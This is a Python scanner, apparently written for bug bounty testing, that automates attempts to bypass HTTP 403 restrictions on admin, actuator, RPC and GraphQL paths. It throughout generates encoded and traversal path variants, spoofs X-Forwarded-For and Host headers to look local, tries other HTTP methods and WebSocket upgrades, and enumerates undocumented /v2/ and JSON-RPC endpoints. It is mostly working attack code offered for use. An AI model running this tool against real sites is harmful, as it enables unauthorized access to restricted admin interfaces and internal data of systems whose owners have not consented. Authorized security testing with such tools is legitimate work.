#!/usr/bin/env python3
"""403 Bypass + RPC Discovery Scanner — CWE-284 (Improper Access Control).

Comprehensive 403 bypass testing combining:
  - 30+ path normalization tricks (case, encoding, traversal, null byte, etc.)
  - Header-based bypasses (X-Original-URL, X-Forwarded-For, Host, etc.)
  - HTTP method confusion (GET→POST→PUT→PATCH→OPTIONS→TRACE)
  - WebSocket upgrade bypass attempts
  - /v2/ path enumeration for undocumented API versions
  - JSON-RPC method enumeration on discovered endpoints

Sources: rpc_bypass.py + rpc_bypass_v2.py from real bug bounty campaign.

Usage:
    python bypass_403.py --target https://example.com --dry-run
    python bypass_403.py --target https://example.com --config /configs/bypass-403-config.yaml

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import sys

from lib import (
    Finding,
    RateLimitedSession,
    get_session_from_env,
    load_config,
    log,
    parse_base_args,
    save_findings,
)

# ---------------------------------------------------------------------------
# Default 403 paths to test (commonly restricted)
# ---------------------------------------------------------------------------

DEFAULT_RESTRICTED_PATHS = [
    "/admin",
    "/admin/",
    "/api/admin",
    "/console",
    "/dashboard",
    "/internal",
    "/management",
    "/actuator",
    "/actuator/env",
    "/server-status",
    "/rpc",
    "/graphql",
    "/sigma/request",
    "/sigma/finalize",
    "/sigma/init",
    "/sigma/challenge",
]

# ---------------------------------------------------------------------------
# Path normalization bypass variants
# ---------------------------------------------------------------------------


def generate_path_variants(path: str) -> list[dict[str, str]]:
    """Generate 30+ path normalization bypass variants for a path."""
    # Strip leading slash for manipulation
    bare = path.lstrip("/")
    variants = []

    def add(name: str, p: str) -> None:
        variants.append({"name": name, "path": p})

    # Original
    add("original", path)
    add("trailing-slash", f"{path}/")
    add("double-slash", f"//{bare}")
    add("dot-prefix", f"/./{bare}")
    add("dot-suffix", f"/{bare}/.")
    add("dotdot-suffix", f"/{bare}/..")
    add("dotdot-semicol", f"/{bare}..;/")

    # Encoding
    encoded = "".join(f"%{ord(c):02x}" for c in bare)
    add("full-urlencode", f"/{encoded}")
    double_encoded = "".join(f"%25{ord(c):02x}" for c in bare)
    add("double-urlencode", f"/{double_encoded}")

    # Case
    add("uppercase", f"/{bare.upper()}")
    add("title-case", f"/{bare.title()}")
    add("mixed-case", f"/{bare[0].upper()}{bare[1:]}" if len(bare) > 1 else f"/{bare}")

    # Null byte / whitespace
    add("null-byte", f"/{bare}%00")
    add("trailing-space", f"/{bare}%20")
    add("trailing-tab", f"/{bare}%09")
    add("semicolon", f"/{bare};")
    add("hash-suffix", f"/{bare}%23")

    # Path traversal
    add("traversal-up-down", f"/anything/../{bare}")
    add("api-prefix", f"/api/{bare}")
    add("api-v1-prefix", f"/api/v1/{bare}")
    add("v2-prefix", f"/v2/{bare}")
    add("v1-prefix", f"/v1/{bare}")

    # Backslash (IIS-style)
    backslash_bare = bare.replace("/", "\\")
    add("backslash", f"/{backslash_bare}")

    # Unicode
    add("unicode-slash", f"/{bare}%ef%bc%8f")

    # Wildcard / globbing
    add("wildcard", f"/{bare}/*")
    add("dot-json", f"/{bare}.json")
    add("dot-html", f"/{bare}.html")
    add("dot-php", f"/{bare}.php")

    return variants


# ---------------------------------------------------------------------------
# Header-based bypass payloads
# ---------------------------------------------------------------------------

BYPASS_HEADERS = [
    {"X-Original-URL": None},           # Will be set to target path
    {"X-Rewrite-URL": None},            # Will be set to target path
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Proto": "https"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Host": "localhost"},
]

HOST_OVERRIDES = [
    "localhost",
    "127.0.0.1",
    "internal",
]

# ---------------------------------------------------------------------------
# HTTP methods to try
# ---------------------------------------------------------------------------

METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE", "HEAD"]

# ---------------------------------------------------------------------------
# JSON-RPC methods to enumerate on discovered endpoints
# ---------------------------------------------------------------------------

DEFAULT_RPC_METHODS = [
    "ping",
    "session.getInfo",
    "account.getSettings",
    "account.getProfile",
    "user.list",
    "space.list",
    "device.list",
    "security.getPolicy",
    "file.list",
    "invite.list",
    "health.check",
    "system.listMethods",
]

# ---------------------------------------------------------------------------
# V2 path enumeration
# ---------------------------------------------------------------------------

V2_PATHS = [
    "auth", "auth/login", "auth/token",
    "account", "users", "spaces", "settings",
    "devices", "rpc", "files", "invites",
    "notifications", "health", "status",
    "version", "websocket", "ws", "events",
    "sigma", "sigma/request", "sigma/finalize",
    "sigma/challenge",
]


# ---------------------------------------------------------------------------
# Scanner functions
# ---------------------------------------------------------------------------


def test_path_bypass(
    sess: RateLimitedSession,
    base: str,
    restricted_paths: list[str],
    dry_run: bool,
) -> list[Finding]:
    """Test path normalization bypass techniques on restricted paths."""
    findings: list[Finding] = []

    for orig_path in restricted_paths:
        variants = generate_path_variants(orig_path)

        for variant in variants:
            url = f"{base}{variant['path']}"
            if dry_run:
                log.info("[dry-run] GET %s [%s]", url, variant["name"])
                continue

            try:
                r = sess.get(url, allow_redirects=False)
                is_bypass = r.status_code not in (403, 404, 405, 400, 301, 302, 308)

                if is_bypass:
                    log.warning("⚠ BYPASS: %s %s → %d [%s]",
                                "GET", variant["path"], r.status_code, variant["name"])
                    findings.append(Finding(
                        title=f"403 Bypass via path normalization on {orig_path}",
                        severity="high",
                        cwe="CWE-284",
                        endpoint=url,
                        method="GET",
                        description=(
                            f"Path normalization bypass on {orig_path} using "
                            f"'{variant['name']}' technique. Original 403 bypassed "
                            f"with status {r.status_code}."
                        ),
                        steps=[
                            f"GET {orig_path} → 403 (blocked)",
                            f"GET {variant['path']} → {r.status_code} (BYPASS)",
                            f"Technique: {variant['name']}",
                        ],
                        impact="Access control bypass — restricted endpoint accessible.",
                        evidence={
                            "technique": variant["name"],
                            "original_path": orig_path,
                            "bypass_path": variant["path"],
                            "status": r.status_code,
                            "response_length": len(r.content),
                            "response_snippet": r.text[:300],
                        },
                    ))
                else:
                    log.debug("  %d GET %s [%s]", r.status_code, variant["path"], variant["name"])

            except Exception as e:
                log.debug("  GET %s: %s", variant["path"], e)

    return findings


def test_header_bypass(
    sess: RateLimitedSession,
    base: str,
    restricted_paths: list[str],
    dry_run: bool,
) -> list[Finding]:
    """Test header-based bypass techniques."""
    findings: list[Finding] = []

    for orig_path in restricted_paths:
        url = f"{base}{orig_path}"

        # Standard header bypasses
        for hdr_template in BYPASS_HEADERS:
            hdrs = {}
            for k, v in hdr_template.items():
                hdrs[k] = v if v is not None else orig_path

            if dry_run:
                hdr_str = ", ".join(f"{k}: {v}" for k, v in hdrs.items())
                log.info("[dry-run] GET %s [headers: %s]", url, hdr_str)
                continue

            try:
                r = sess.get(url, headers=hdrs, allow_redirects=False)
                hdr_str = ", ".join(f"{k}: {v}" for k, v in hdrs.items())

                if r.status_code not in (403, 404, 405, 400, 301, 302):
                    log.warning("⚠ HEADER BYPASS: %s → %d [%s]", orig_path, r.status_code, hdr_str)
                    findings.append(Finding(
                        title=f"403 Bypass via header injection on {orig_path}",
                        severity="high",
                        cwe="CWE-284",
                        endpoint=url,
                        method="GET",
                        description=(
                            f"Header-based 403 bypass on {orig_path}. "
                            f"Headers: {hdr_str}. Status: {r.status_code}."
                        ),
                        steps=[
                            f"GET {orig_path} → 403 (blocked)",
                            f"GET {orig_path} + {hdr_str} → {r.status_code} (BYPASS)",
                        ],
                        impact="Access control bypass via header manipulation.",
                        evidence={
                            "headers": hdrs,
                            "original_path": orig_path,
                            "status": r.status_code,
                            "response_length": len(r.content),
                        },
                    ))
            except Exception as e:
                log.debug("  %s [header bypass]: %s", orig_path, e)

        # Host header overrides
        for host in HOST_OVERRIDES:
            if dry_run:
                log.info("[dry-run] GET %s [Host: %s]", url, host)
                continue

            try:
                r = sess.get(url, headers={"Host": host}, allow_redirects=False)
                if r.status_code not in (403, 404, 405, 400, 301, 302, 421):
                    log.warning("⚠ HOST BYPASS: %s → %d [Host: %s]",
                                orig_path, r.status_code, host)
                    findings.append(Finding(
                        title=f"403 Bypass via Host header on {orig_path}",
                        severity="high",
                        cwe="CWE-284",
                        endpoint=url,
                        method="GET",
                        description=(
                            f"Host header override bypasses 403 on {orig_path}. "
                            f"Host: {host}. Status: {r.status_code}."
                        ),
                        steps=[
                            f"GET {orig_path} → 403",
                            f"GET {orig_path} + Host: {host} → {r.status_code}",
                        ],
                        impact="Access control bypass — may indicate virtual host routing issues.",
                        evidence={
                            "host": host,
                            "status": r.status_code,
                            "response_snippet": r.text[:300],
                        },
                    ))
            except Exception as e:
                log.debug("  %s [Host: %s]: %s", orig_path, host, e)

    return findings


def test_method_bypass(
    sess: RateLimitedSession,
    base: str,
    restricted_paths: list[str],
    dry_run: bool,
) -> list[Finding]:
    """Test HTTP method confusion bypass."""
    findings: list[Finding] = []

    for orig_path in restricted_paths:
        url = f"{base}{orig_path}"

        for method in METHODS:
            if dry_run:
                log.info("[dry-run] %s %s", method, url)
                continue

            try:
                r = sess.session.request(
                    method, url, timeout=15, allow_redirects=False,
                )
                # Only flag non-standard success responses (not OPTIONS preflight)
                if r.status_code not in (403, 404, 405, 400, 301, 302) and method != "OPTIONS":
                    log.warning("⚠ METHOD BYPASS: %s %s → %d", method, orig_path, r.status_code)
                    findings.append(Finding(
                        title=f"403 Bypass via {method} method on {orig_path}",
                        severity="medium",
                        cwe="CWE-284",
                        endpoint=url,
                        method=method,
                        description=(
                            f"HTTP method {method} bypasses 403 on {orig_path}. "
                            f"Original GET returned 403, {method} returns {r.status_code}."
                        ),
                        steps=[
                            f"GET {orig_path} → 403",
                            f"{method} {orig_path} → {r.status_code}",
                        ],
                        impact="Access control bypass via method confusion.",
                        evidence={
                            "method": method,
                            "status": r.status_code,
                            "response_length": len(r.content),
                        },
                    ))
            except Exception as e:
                log.debug("  %s %s: %s", method, orig_path, e)

    return findings


def test_websocket_bypass(
    sess: RateLimitedSession,
    base: str,
    dry_run: bool,
) -> list[Finding]:
    """Test WebSocket upgrade on RPC-like endpoints."""
    findings: list[Finding] = []
    ws_paths = ["/rpc", "/v2/rpc", "/ws", "/v2/ws", "/websocket", "/v2/websocket"]
    ws_headers = {
        "Upgrade": "websocket",
        "Connection": "Upgrade",
        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
        "Sec-WebSocket-Version": "13",
    }

    for path in ws_paths:
        url = f"{base}{path}"
        if dry_run:
            log.info("[dry-run] WS upgrade %s", url)
            continue

        try:
            r = sess.get(url, headers=ws_headers, allow_redirects=False)
            # 101 = WebSocket handshake success
            if r.status_code == 101 or r.status_code not in (403, 404, 400, 405):
                log.warning("⚠ WEBSOCKET: %s → %d", path, r.status_code)
                findings.append(Finding(
                    title=f"WebSocket upgrade accepted on {path}",
                    severity="medium" if r.status_code != 101 else "high",
                    cwe="CWE-284",
                    endpoint=url,
                    method="GET (Upgrade: websocket)",
                    description=(
                        f"WebSocket upgrade request on {path} returned {r.status_code}. "
                        f"This may bypass reverse proxy 403 restrictions."
                    ),
                    steps=[
                        f"GET {path} with Upgrade: websocket headers → {r.status_code}",
                    ],
                    impact="Potential access to blocked RPC/API via WebSocket tunnel.",
                    evidence={
                        "status": r.status_code,
                        "response_snippet": r.text[:300],
                    },
                ))
        except Exception as e:
            log.debug("  WS %s: %s", path, e)

    return findings


def test_v2_enumeration(
    sess: RateLimitedSession,
    base: str,
    dry_run: bool,
) -> list[Finding]:
    """Enumerate /v2/ paths that may bypass reverse proxy rules."""
    findings: list[Finding] = []

    for path in V2_PATHS:
        url = f"{base}/v2/{path}"
        if dry_run:
            log.info("[dry-run] GET %s", url)
            continue

        try:
            r = sess.get(url, allow_redirects=False)
            if r.status_code not in (403, 404, 503):
                log.warning("⚠ V2 PATH: /v2/%s → %d", path, r.status_code)
                findings.append(Finding(
                    title=f"Undocumented /v2/{path} endpoint accessible",
                    severity="medium",
                    cwe="CWE-284",
                    endpoint=url,
                    method="GET",
                    description=(
                        f"/v2/{path} returned {r.status_code} — may bypass "
                        f"version-specific access controls applied only to /v1/."
                    ),
                    steps=[f"GET /v2/{path} → {r.status_code}"],
                    impact="Access to undocumented API version — may expose additional functionality.",
                    evidence={
                        "status": r.status_code,
                        "response_length": len(r.content),
                        "response_snippet": r.text[:300],
                    },
                ))
        except Exception as e:
            log.debug("  /v2/%s: %s", path, e)

    return findings


def test_rpc_methods(
    sess: RateLimitedSession,
    base: str,
    rpc_methods: list[str],
    dry_run: bool,
) -> list[Finding]:
    """Enumerate JSON-RPC methods on /rpc-like endpoints."""
    findings: list[Finding] = []
    rpc_endpoints = ["/rpc", "/api/rpc", "/v2/rpc", "/jsonrpc", "/api/jsonrpc"]

    for endpoint in rpc_endpoints:
        url = f"{base}{endpoint}"
        for method in rpc_methods:
            payload = {
                "jsonrpc": "2.0",
                "method": method,
                "params": {},
                "id": 1,
            }
            if dry_run:
                log.info("[dry-run] POST %s [method=%s]", url, method)
                continue

            try:
                r = sess.post(url, json=payload, allow_redirects=False)
                if r.status_code not in (403, 404, 405):
                    body = r.text[:300]
                    log.warning("⚠ RPC: %s %s → %d %s", endpoint, method, r.status_code, body[:100])
                    findings.append(Finding(
                        title=f"JSON-RPC method {method} accessible on {endpoint}",
                        severity="high",
                        cwe="CWE-284",
                        endpoint=url,
                        method="POST",
                        description=(
                            f"JSON-RPC method '{method}' returned {r.status_code} on {endpoint}. "
                            f"RPC endpoint may be accessible despite WAF/proxy restrictions."
                        ),
                        steps=[
                            f"POST {endpoint} with JSON-RPC method={method}",
                            f"Response: {r.status_code}",
                        ],
                        impact="RPC method exposure — may allow unauthenticated data access or actions.",
                        evidence={
                            "rpc_method": method,
                            "status": r.status_code,
                            "response_snippet": body,
                        },
                    ))
            except Exception as e:
                log.debug("  RPC %s %s: %s", endpoint, method, e)

    return findings


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> None:
    parser = parse_base_args()
    parser.add_argument("--paths", nargs="*",
                        help="Restricted paths to test (overrides defaults)")
    parser.add_argument("--rpc-methods", nargs="*",
                        help="JSON-RPC methods to enumerate")
    args = parser.parse_args()

    if args.verbose:
        log.setLevel("DEBUG")

    config = load_config(args.config)
    sess = get_session_from_env()
    base = args.target.rstrip("/")

    # Config overrides
    restricted_paths = (
        args.paths
        or config.get("restricted_paths")
        or DEFAULT_RESTRICTED_PATHS
    )
    rpc_methods = (
        args.rpc_methods
        or config.get("rpc_methods")
        or DEFAULT_RPC_METHODS
    )

    findings: list[Finding] = []

    log.info("=" * 60)
    log.info("403 Bypass + RPC Discovery Scanner")
    log.info("Target: %s | Paths: %d | Dry-run: %s", base, len(restricted_paths), args.dry_run)
    log.info("=" * 60)

    # Phase 1: Path normalization bypass (30+ variants per path)
    log.info("[phase 1] Path normalization bypass (%d paths × 30+ variants)...",
             len(restricted_paths))
    findings.extend(test_path_bypass(sess, base, restricted_paths, args.dry_run))

    # Phase 2: Header-based bypass
    log.info("[phase 2] Header-based bypass...")
    findings.extend(test_header_bypass(sess, base, restricted_paths, args.dry_run))

    # Phase 3: HTTP method confusion
    log.info("[phase 3] HTTP method confusion...")
    findings.extend(test_method_bypass(sess, base, restricted_paths, args.dry_run))

    # Phase 4: WebSocket upgrade
    log.info("[phase 4] WebSocket upgrade bypass...")
    findings.extend(test_websocket_bypass(sess, base, args.dry_run))

    # Phase 5: /v2/ path enumeration
    log.info("[phase 5] /v2/ path enumeration...")
    findings.extend(test_v2_enumeration(sess, base, args.dry_run))

    # Phase 6: JSON-RPC method enumeration
    log.info("[phase 6] JSON-RPC method enumeration...")
    findings.extend(test_rpc_methods(sess, base, rpc_methods, args.dry_run))

    log.info("=" * 60)
    log.info("Results: %d findings", len(findings))
    if findings and not args.dry_run:
        save_findings(findings, "bypass-403-advanced")


if __name__ == "__main__":
    main()
